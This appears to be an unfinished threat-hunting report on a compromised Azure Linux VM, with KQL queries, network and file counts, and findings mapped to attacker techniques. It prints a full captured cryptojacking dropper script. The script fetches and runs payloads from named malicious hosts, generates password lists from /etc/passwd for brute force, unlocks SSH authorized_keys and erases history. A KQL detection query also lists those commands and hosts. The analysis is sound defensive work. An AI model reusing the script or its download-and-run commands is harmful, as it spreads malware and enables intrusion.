$${{\color{Goldenrod}\Huge{\textsf{  Threat \ Hunting \ Report\ \}}}}\$$


${{\color{Goldenrod}\large{\textsf{Summary\ }}}}\$
<br> </br>
A report from Microsot Azure indicated that there was a violation of the Acceptable ue policy
Activity Summary 
- Date: 3/18/2025 6:40:40 AM
- Description: External reports of Brute Force traffic from you resource where recieved
- Reported Source: 20.81.228.191
<br> </br>

${{\color{Goldenrod}\large{\textsf{Logon Events\ }}}}\$
```
DeviceInfo
| where PublicIP == "20.81.228.191"
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Device name was identified as "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"


${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1592 Gathering Victim Host information
- This indicates that the default passwords for vm's was compromised 
<br></br>



```
DeviceLogonEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "LogonFailed"
| summarize count()by ActionType, FailureReason, DeviceName
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Device had 308 failed logon attempts indicateing evidence of brute force attempt
<br></br>

${{\color{Goldenrod}\large{\textsf{Network Activity\ }}}}\$


```
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
|summarize count()by RemoteIP
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
| IP Address        | Count |
|------------------|-------|
| 168.63.129.16   | 9     |
| 169.254.169.254 | 25    |
| 8.219.145.111   | 1     |
| 172.66.0.26     | 6     |
| 162.159.140.26  | 6     |
| 172.202.64.10   | 10    |
| 172.202.65.10   | 9     |
| 127.0.0.53      | 8     |
| 0.0.0.0         | 1     |
| 20.60.180.65    | 1     |
| 196.251.73.38   | 3     |
| 10.0.0.0        | 1     |

<br> </br>

```
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
|summarize totalcount =count()
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$: Total count of 184782
- the device attempted to connect to various ip addresses that 184782 times.
<br> </br>

${{\color{Goldenrod}\large{\textsf{File Events\ }}}}\$


```
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "FileCreated"
| summarize count() by ActionType
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ There were a total of 592 Files created
<br> </br>


```
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "FileDeleted" 
| summarize count()by ActionType
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ There was a total of 7025 deleted files
<br> </br>

${{\color{Goldenrod}\large{\textsf{Process Events\}}}}\$
```
DeviceProcessEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ProcessCommandLine contains "bash"
| project InitiatingProcessCommandLine
```
Output
- /bin/sh -c "/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown
- /bin/bash /var/tmp/.update-logs/./.b

${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- this command .update-logs is an attempt to remain stealth
- dev/null - is used to prevent logging


${{\color{Goldenrod}\large{\textsf{Detecting Suspicious Process Execution\}}}}\$
```
DeviceProcessEvents
| where Timestamp > ago(7d) 
| where ProcessCommandLine has_any ("wget", "curl", "chmod", "pkill", "rm", "killall", "chattr", "ulimit")
| where ProcessCommandLine has_any ("85.31.47.99", "dinpasiune.com", "/var/tmp/", "/dev/shm/", "/tmp/")
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine
| order by Timestamp desc
```
- This detected execution of risky commands such as (wget,curl,chmod,etc)
- This query aslo flags processes operating in temporary directories

${{\color{Red}\large{\textsf{Findings:\ }}}}\$
chmod +x /var/tmp/.update-logs/.bisis
- files with a . prefix are hidden which is a commone method to avoid detection
rm -f /tmp/tmp.4O5WBRQSz9 /tmp/tmp.A6UVHHtvt2 /tmp/tmp.qG8pAKPeQc
- rm -f forcefully deletes files without prompting, this file maybe used to hide the payload
wget https://secure.eicar.org/eicar.com.txt -O /tmp/eicar.txt
- potential attempt by the attacker to bypass antivirus detection
```
./retea -c '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 #!/bin/bash
key=$1
user=$2

if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
echo -e ""
else
echo Logged with successfully.
rm -rf .retea 
crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents  /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget85.31.47.99/payload || curl -O -s -L85.31.47.99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history
chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_history
fi

rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999

cd /dev/shm
mkdir /dev/shm/.x > /dev/null 2>&1
mv network .x/
cd .x
rm -rf retea ips iptemp ips iplist
sleep 1
rm -rf pass
useri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1`
echo $useri > .usrs
pasus=.usrs
check=`grep -c . .usrs`
for us in $(cat $pasus) ; do
printf "$us $us\n" >> pass
printf "$us $us"$us"\n" >> pass
printf "$us "$us"123\n" >> pass
printf "$us "$us"123456\n" >> pass
printf "$us 123456\n">> pass
printf "$us 1\n">> pass
printf "$us 12\n">> pass
printf "$us 123\n">> pass
printf "$us 1234\n">> pass
printf "$us 12345\n">> pass
printf "$us 12345678\n">> pass
printf "$us 123456789\n">> pass
printf "$us 123.com\n">> pass
printf "$us 123456.com\n">> pass
printf "$us 123\n" >> pass
printf "$us 1qaz@WSX\n" >> pass
printf "$us "$us"@123\n" >> pass
printf "$us "$us"@1234\n" >> pass
printf "$us "$us"@123456\n" >> pass
printf "$us "$us"123\n" >> pass
printf "$us "$us"1234\n" >> pass
printf "$us "$us"123456\n" >> pass
printf "$us qwer1234\n" >> pass
printf "$us 111111\n">> pass
printf "$us Passw0rd\n" >> pass
printf "$us P@ssw0rd\n" >> pass
printf "$us qaz123!@#\n" >> pass
printf "$us !@#\n" >> pass
printf "$us password\n" >> pass
printf "$us Huawei@123\n" >> pass
done
wait
sleep 0.5
cat bios.txt | sort -R | uniq | uniq > i
cat i > bios.txt
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"
sleep 25
function Miner {
rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ;  rm -rf ~/.bash_history
history -c
}
Miner
' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
```
- This is a highly malicious script designed to execute a cryptojacking attack
- it extracts all valid system users from /etc/password
- then it generates a password list of common patterns
- pkill xmrig,killaall cnrig, killall xmrig: kills exisiting cryptominers
```
wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
chmod +x cache
./cache >/dev/null 2>&1 & disown
```
- this downloads and tuns new cryptomining malware from a malicious server 85.31.47.99
- then rm -f is used to remove log and history
- crontab -r : aims to prevent system admins from scheduling security scans



```
rm -rf /etc/sysctl.conf
echo "fs.file-max = 2097152" > /etc/sysctl.conf
sysctl -p
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Attempts to Modify SYsyem Limits(Priviledge Escalation)
- allowing more files to be open for intensive mining

```
mkdir /dev/shm/.x
cd /dev/shm/.x
mv network .x/
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$  /dev/shm/ is used to execute files in RAM, avoiding disk-based detection

```
chattr -iae ~/.ssh/authorized_keys
```

${{\color{Red}\large{\textsf{Findings:\ }}}}\$ Could disable SSH security and inset an attackers key for persitance

```
rm -f /opt/nessus_agent/var/nessus/tmp/nessusagent
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$Attacker is forcibly removing the nessus agent to avoid detection as well as prevent vulnerability scanning of the vm
## Conclusion
Summarize the overall findings, potential impact, and next steps or recommendations.


Summary
- 


